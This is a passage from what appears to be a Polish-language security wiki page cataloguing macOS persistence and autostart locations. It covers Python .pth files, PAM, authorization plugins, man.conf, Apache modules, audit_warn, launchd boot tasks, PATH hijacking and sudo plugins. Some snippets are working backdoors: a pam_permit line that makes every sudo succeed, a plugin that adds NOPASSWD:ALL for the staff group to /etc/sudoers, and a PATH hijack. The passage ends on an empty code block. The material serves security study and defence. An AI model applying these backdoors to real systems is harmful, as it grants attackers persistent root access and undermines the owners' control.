Launch Services pobiera informacje o obsługiwanych schematach URL i dokumentach z pliku `Info.plist` zarejestrowanej aplikacji. [Przewodnik rejestracji Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) informuje, że rejestracja może nastąpić, gdy Finder wykryje aplikację, podczas uruchamiania systemu lub logowania albo za pośrednictwem jawnego API rejestracji; samo umieszczenie aplikacji w dowolnym miejscu nie gwarantuje natychmiastowego wyzwolenia rejestracji. Po rejestracji otwarcie pasującego adresu URL lub dokumentu może uruchomić wybraną aplikację obsługującą, z uwzględnieniem wyboru domyślnego programu przez użytkownika i standardowych kontroli uruchamiania macOS. Obsługiwane API `LSSetDefaultHandlerForURLScheme` zmienia preferowany przez użytkownika program obsługujący adresy URL; nie powoduje automatycznego uruchomienia nowo dodanej aplikacji.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nie zarejestrowano żadnej aplikacji ani nie zmieniono preferencji obsługi na testowym Macu z macOS 26.5.2. Aby przetestować rzeczywisty mechanizm obsługi, użyj jednorazowego konta użytkownika, zarejestruj aplikację wyłącznie do oznaczania zdarzeń z unikalnym schematem, wywołaj jej URL, a następnie usuń aplikację i jej rejestrację.

Szczegółowe informacje o enumerowaniu i nadużywaniu mechanizmów obsługi rozszerzeń plików i schematów URL znajdziesz w:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Pliki startowe Pythona (`.pth` / `usercustomize` / `sitecustomize`)

Opis: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Uruchamia się przy starcie odpowiedniego interpretera Pythona, jeśli włączony jest dany katalog `site`; wyzwalanie nie jest jednakowe we wszystkich środowiskach wirtualnych, kompilacjach Pythona ani przy wszystkich flagach startowych
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Działa z uprawnieniami i dostępem TCC procesu, który uruchomił interpreter

#### Lokalizacja

- **`$(python3 -m site --user-site)/*.pth`** (kompilacje macOS framework: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Nie wymaga uprawnień roota (katalog z prawami zapisu dla użytkownika)
  - **Wyzwalanie**: start tej kompilacji Pythona z włączoną lokalizacją pakietów użytkownika; moduł `site` przetwarza pliki `.pth` w aktywnych katalogach `site`
- **`<user-site>/usercustomize.py`**
  - Nie wymaga uprawnień roota
  - **Wyzwalanie**: start z włączoną lokalizacją pakietów użytkownika (automatycznie importowany przez `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (np. `/opt/homebrew/lib/python3.13/site-packages/` lub ścieżki systemowe)
  - W zależności od lokalizacji interpretera mogą być wymagane uprawnienia roota lub administratora
  - **Wyzwalanie**: start interpretera, który uwzględnia ten katalog `site`

#### Opis i wykorzystanie

Podczas uruchamiania Python zazwyczaj importuje `site` i skanuje aktywne katalogi `site-packages` w poszukiwaniu plików `.pth`. Oprócz dodawania ścieżek, wiersz `.pth` rozpoczynający się od `import ` wykonuje kod Pythona, nawet jeśli wskazany moduł nie jest później używany. Python próbuje również zaimportować `sitecustomize` oraz — **gdy lokalizacja pakietów użytkownika jest włączona** — `usercustomize`.<sup>[[56]](#references)</sup> Wyzwalaczem jest późniejsze uruchomienie interpretera, który korzysta ze zmodyfikowanego katalogu. `-S` wyłącza przetwarzanie `site`; `-s`, `-I` lub `PYTHONNOUSERSITE` wyłączają warianty dotyczące **lokalizacji pakietów użytkownika**. `-I` zasadniczo nie wyłącza globalnego `sitecustomize`. Środowiska wirtualne mogą również wykluczać lokalizację pakietów użytkownika. Sprawdź `python3 -m site` dla konkretnego interpretera.

Poniższy PoC uruchomiono na macOS 26.5.2. `PYTHONUSERBASE` przenosi lokalizację pakietów użytkownika do katalogu tymczasowego na potrzeby tego testu; rzeczywista lokalizacja pakietów użytkownika nie jest modyfikowana:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Oba znaczniki się pojawiły. Powtórzenie z `-s`, `-I` lub `-S` zapobiegło pojawieniu się obu znaczników **user-site** w tym teście. Nie testowano `sitecustomize` w globalnym katalogu site.

## Root Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku**, będąc **rootem** i/lub wymagając **innych nietypowych warunków**.

### Periodic

> [!CAUTION]
> **Mechanizm historyczny:** Na maszynie testowej z macOS 26.5.2 nie ma `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ani demonów launch `com.apple.periodic-*`. Nie zakładaj, że utworzenie `/etc/periodic` w bieżącym systemie spowoduje zaplanowane wykonanie jego zawartości. Przed użyciem poniższego przykładu sprawdź, czy w docelowej wersji istnieją zarówno polecenie, jak i włączony scheduler.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Przydatne do sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagany root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Wymagany root
  - **Wyzwalacz**: Gdy nadejdzie odpowiednia pora
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
  - Wymagany root
  - **Wyzwalacz**: Gdy nadejdzie odpowiednia pora

#### Opis i wykorzystanie

W starszych wersjach skrypty periodic (**`/etc/periodic`**) były uruchamiane zgodnie z harmonogramem przez **launch daemons** w `/System/Library/LaunchDaemons/com.apple.periodic*`. Od macOS Big Sur 11.5 runner periodic wykonywał skrypty w katalogach periodic jako **właściciel każdego pliku**, zamykając wcześniejszą ścieżkę eskalacji uprawnień.<sup>[[27]](#references)</sup> Poniższe polecenia i listy katalogów przedstawiają dane historyczne, a nie wynik testu macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Inne skrypty okresowe, które będą uruchamiane, są wskazane w **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

W starszych systemach, w których zainstalowano i włączono `periodic` oraz jego launch daemons, `/etc/daily.local`, `/etc/weekly.local` i `/etc/monthly.local` stanowiły dodatkowe miejsca uruchamiania. Nieszkodliwa kontrola tylko do odczytu wygląda następująco:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Reguła oparta na właścicielu miała zastosowanie do skryptów znajdujących się bezpośrednio w katalogach okresowych. Historyczny wrapper `999.local` wczytywał pliki `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local` bez tej samej kontroli właściciela; gdy scheduler działał jako root, pliki lokalne również były uruchamiane jako root. To rozróżnienie oraz zmiana w Big Sur 11.5 zostały opisane w [oryginalnym opracowaniu](https://theevilbit.github.io/beyond/beyond_0019/). Nie należy zakładać, że którakolwiek z tych ścieżek jest aktywna, gdy nie ma `periodic`.

### PAM

Opracowanie: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Opracowanie: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Przydatne do omijania sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagany jest jednak root
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zawsze wymagany jest root

#### Opis i wykorzystanie

Ponieważ PAM jest bardziej związany z **persistence** i malware niż z łatwym uruchamianiem kodu w macOS, ten blog nie zawiera szczegółowego wyjaśnienia. **Przeczytaj opracowania, aby lepiej zrozumieć tę technikę**.<sup>[[28]](#references)</sup>

Sprawdź moduły PAM za pomocą:

```bash
ls -l /etc/pam.d
```

Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta, jak zmodyfikowanie modułu /etc/pam.d/sudo i dodanie na początku wiersza:

```bash
auth       sufficient     pam_permit.so
```

Będzie to więc **wyglądać** mniej więcej tak:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

W związku z tym każda próba użycia **`sudo` zakończy się powodzeniem**.

> [!CAUTION]
> Pamiętaj, że ten katalog jest chroniony przez TCC, więc użytkownik z dużym prawdopodobieństwem zobaczy monit z prośbą o dostęp.

Innym dobrym przykładem jest `su` — można tu zobaczyć, że modułom PAM również można przekazywać parametry (można też umieścić backdoor w tym pliku):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Wtyczki autoryzacji

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga jednak uprawnień root i dodatkowej konfiguracji
- Ominięcie TCC: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
  - Wymagane uprawnienia root
  - Konieczne jest również skonfigurowanie bazy danych autoryzacji tak, aby używała wtyczki

#### Opis i wykorzystanie

Możesz utworzyć wtyczkę autoryzacji, która będzie uruchamiana, gdy użytkownik się zaloguje, aby zapewnić persistence. Więcej informacji o tworzeniu takich wtyczek znajdziesz w poprzednich writeupach (zachowaj ostrożność — źle napisana wtyczka może zablokować Ci dostęp do systemu i konieczne będzie wyczyszczenie Maca w trybie odzyskiwania).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Przenieś** pakiet do lokalizacji, z której ma zostać załadowany:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Na koniec dodaj **regułę**, aby załadować tę wtyczkę:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Mechanizm **`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto **`privileged`** sprawi, że zostanie on wykonany przez root.

Wyzwól go za pomocą:

```bash
security authorize com.asdf.asdf
```

A następnie grupa **staff** powinna mieć dostęp do sudo (sprawdź `/etc/sudoers`, aby to potwierdzić).

### Man.conf

Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są jednak uprawnienia root, a użytkownik musi użyć man
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
  - Wymagane uprawnienia root
  - **`/private/etc/man.conf`**: używany za każdym razem, gdy uruchamiane jest man

#### Opis i exploit

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarny plik/skrypt używany do otwierania plików dokumentacji man. Można więc zmodyfikować ścieżkę do pliku wykonywalnego, aby za każdym razem, gdy użytkownik użyje man do odczytania dokumentacji, uruchamiany był backdoor.<sup>[[31]](#references)</sup>

Na przykład ustaw w **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Następnie utwórz `/tmp/view` jako:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymagane są uprawnienia roota i uruchomiony Apache
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd nie ma uprawnień entitlements

#### Lokalizacja

- **`/etc/apache2/httpd.conf`**
  - Wymagane uprawnienia roota
  - Wyzwalacz: uruchomienie Apache2

#### Opis i exploit

W pliku `/etc/apache2/httpd.conf` można wskazać moduł do załadowania, dodając wiersz taki jak:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

W ten sposób skompilowany moduł zostanie załadowany przez Apache. Jedyne, co musisz zrobić, to **podpisać go ważnym certyfikatem Apple** albo **dodać nowy zaufany certyfikat** w systemie i **podpisać go** tym certyfikatem.

Następnie, jeśli to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Przykład kodu dla Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework audytu BSM

Opis: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga uprawnień roota, uruchomionego auditd i wywołania ostrzeżenia
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/etc/security/audit_warn`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Gdy auditd wykryje ostrzeżenie

#### Opis i exploit

Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** zostaje **uruchomiony**. Możesz więc dodać do niego swój payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.

### Elementy startowe

> [!CAUTION] > **Ta funkcja jest przestarzała, więc w tych katalogach nie powinno być żadnych plików.**

**StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu katalogu musi on zawierać dwa konkretne pliki:

1. **Skrypt rc**: skrypt powłoki wykonywany podczas uruchamiania.
2. **Plik plist** o nazwie `StartupParameters.plist`, zawierający różne ustawienia konfiguracji.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` znajdują się we właściwym katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego komponentu w moim macOS, więc więcej informacji znajdziesz w writeupie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Wprowadzony przez Apple **emond** to mechanizm rejestrowania, który wydaje się niedopracowany lub być może porzucony, a mimo to nadal jest dostępny. Choć nie przynosi szczególnych korzyści administratorowi Maca, ta mało znana usługa może służyć aktorom zagrożeń jako subtelna metoda persistence, prawdopodobnie niezauważona przez większość administratorów macOS.<sup>[[34]](#references)</sup>

Dla osób świadomych istnienia **emond** wykrycie jego złośliwego użycia jest proste. LaunchDaemon systemu dla tej usługi szuka skryptów do uruchomienia w jednym katalogu. Można to sprawdzić za pomocą następującego polecenia:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokalizacja

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: Przy użyciu XQuartz

#### Opis i exploit

XQuartz **nie jest już instalowany w macOS**, więc więcej informacji znajdziesz w writeupie.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalacja kext jest tak skomplikowana, nawet jako root, że nie uważa się jej za praktyczną technikę ucieczki z sandboxa ani utrzymywania dostępu, chyba że masz exploit.

#### Lokalizacja

Aby zainstalować KEXT jako element startowy, musi on zostać **zainstalowany w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
  - Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
  - Pliki KEXT instalowane przez oprogramowanie firm trzecich

Możesz wyświetlić listę aktualnie załadowanych plików kext za pomocą:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Więcej informacji o [**kernel extensions znajdziesz w tej sekcji**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
  - Wymagane uprawnienia root

#### Opis i wykorzystanie

Wygląda na to, że `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego, udostępniając jednocześnie usługę XPC... Problem polegał na tym, że plik binarny nie istniał, więc można było umieścić tam własny plik, a gdy wywołano usługę XPC, uruchamiany był właśnie ten plik.<sup>[[35]](#references)</sup>

Nie mogę już znaleźć tego w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Uruchomienie usługi (rzadko)

#### Opis i wykorzystanie

Najwyraźniej ten skrypt nie jest uruchamiany zbyt często. Nie udało mi się go nawet znaleźć w moim macOS, więc po więcej informacji zajrzyj do opisu.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **To nie działa w nowoczesnych wersjach MacOS**

Można też umieścić tutaj **polecenia, które zostaną wykonane podczas uruchamiania.** Przykład zwykłego skryptu rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Zadania rozruchowe launchd

Opis: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Przydatne do obejścia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga roota)
- Wymagany root oraz obejście **SIP** lub uprawnienie **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access — zależnie od ścieżki

#### Lokalizacja

`launchd` osadza plist w sekcji **`__TEXT,__config`**, która opisuje wczesne „zadania rozruchowe”. Kilka skryptów/binarek referencyjnych, które domyślnie **nie istnieją** i mogą zostać utworzone przez atakującego:

- Zestaw obejść SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Zestaw TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` istnieje domyślnie tylko w Sequoia i nowszych wersjach)

#### Opis i wykorzystanie

Zrzut wbudowanej tabeli zadań pozwala sprawdzić, które pliki uruchomi `launchd` oraz jakie klucze są obsługiwane (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Utworzenie jednego z wymienionych plików (np. `/etc/rc.server`) sprawia, że `launchd` wykona go przy następnym restarcie systemu (w przestrzeni użytkownika). Najbardziej użyteczne wpisy są blokowane przez SIP lub wymagają TCC SysAdminFiles/Full Disk Access, więc jest to technika wymagająca uprawnień root i uruchamiana podczas restartu.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Opis: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Zadanie rozruchowe `rc.trampoline` podczas uruchamiania systemu uruchamia **platformowy plik binarny (podpisany przez Apple)** zapisany w zmiennej NVRAM `apple-trusted-trampoline`, ale **tylko wtedy, gdy ustawiono argument rozruchowy `rc.trampoline=1`, a SIP jest wyłączone** (obowiązuje limit rozmiaru około 390&nbsp;KB oraz wymóg blokującego działania/szybkiego zakończenia). Ponieważ wymaga **uprawnień root + wyłączonego SIP + ładunku podpisanego przez Apple**, w praktyce jest to metoda niemal nieprzydatna do utrzymania dostępu i została tu wymieniona wyłącznie dla kompletności.<sup>[[41]](#references)</sup>

### /etc/paths i /etc/paths.d (PATH hijack)

- Przydatne do omijania sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga uprawnień root do zapisu)
- Wymagane uprawnienia root

#### Lokalizacja

- **`/etc/paths`** i **`/etc/paths.d/*`** — odczytywane przez **`path_helper`** (wywoływany z `/etc/zprofile`) w celu utworzenia domyślnej wartości `PATH` podczas logowania.

#### Opis i wykorzystanie

Oba pliki są własnością root. Dodanie na początku ścieżki katalogu kontrolowanego przez atakującego (przez edycję `/etc/paths` lub umieszczenie pliku w `/etc/paths.d/`) sprawia, że katalog ten pojawia się na początku wartości `PATH` w każdej nowej powłoce logowania. W rezultacie złośliwy plik binarny o nazwie typowej komendy (`ls`, `git` itd.) **przesłania** oryginalny plik i uruchomi się przy następnym wywołaniu tej komendy przez ofiarę.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Opis: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga roota)
- Wymaga roota; rezultat **omija SIP**. Podatne wersje macOS: **15.0–15.1**, poprawiono w **15.2**

#### Lokalizacja

- Umieść pakiet systemu plików w **`/Library/Filesystems/`**.

#### Opis i wykorzystanie

`storagekitd` ma entitlement **`com.apple.rootless.install.heritable`** i uruchamiał pliki binarne pakietów systemu plików z **odziedziczoną** możliwością omijania SIP. Umieszczając złośliwy pakiet systemu plików, atakujący mógł uruchomić kod z możliwością ominięcia SIP, aby zainstalować **trwałe rozszerzenia jądra** lub zapisywać dane w chronionych przez SIP katalogach `LaunchDaemon` — taka persystencja przetrwałaby i pokonała standardowe zabezpieczenia.<sup>[[46]](#references)</sup> Apple naprawiło ten problem w macOS Sequoia 15.2.

### Wtyczki sudo (/etc/sudo.conf)

Opis: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle) (wymaga roota do zapisu w `/etc/sudo.conf`)
- Instalacja wymaga roota; wtyczka działa następnie podczas **każdego wywołania `sudo`** (w kontekście setuid-root)

#### Lokalizacja

- **`/etc/sudo.conf`** — wiersze `Plugin` wczytują obiekty współdzielone z **`/usr/libexec/sudo/`** (lub ze ścieżki bezwzględnej). Domyślnie plik nie istnieje (sudo używa wbudowanej polityki), więc jego utworzenie zapewnia czysty punkt zaczepienia.

#### Opis i wykorzystanie

`sudo` wczytuje wtyczki polityki, zatwierdzania i audytu z `/etc/sudo.conf`. Ponieważ `sudo` ma ustawiony bit setuid-root, złośliwa wtyczka w postaci obiektu współdzielonego jest uruchamiana z **uprawnieniami roota za każdym razem, gdy dowolny użytkownik uruchamia `sudo`** — zapewnia to trwałą persystencję roota, która pozwala również obserwować każde polecenie sudo.<sup>[[51]](#references)</sup> macOS zawiera sudo 1.9.x, które obsługuje API wtyczek.

```bash
